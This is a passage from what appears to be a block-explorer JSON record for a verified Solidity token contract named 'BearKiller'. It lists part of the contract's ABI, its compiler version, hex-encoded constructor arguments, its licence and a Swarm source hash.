:true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"transferownership\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BearKiller", "CompilerVersion": "v0.5.17+commit.d19bba13", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000001a13b8600000000000000000000000000000000000000000000000000000000000000000b42656172204b696c6c65720000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008424541524b494c4c000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "GNU GPLv2", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://c7e02f3e5cabb0320ab536d25c3fde0fbafb33a4fe4d4e251cff020f69da0f1a"}]}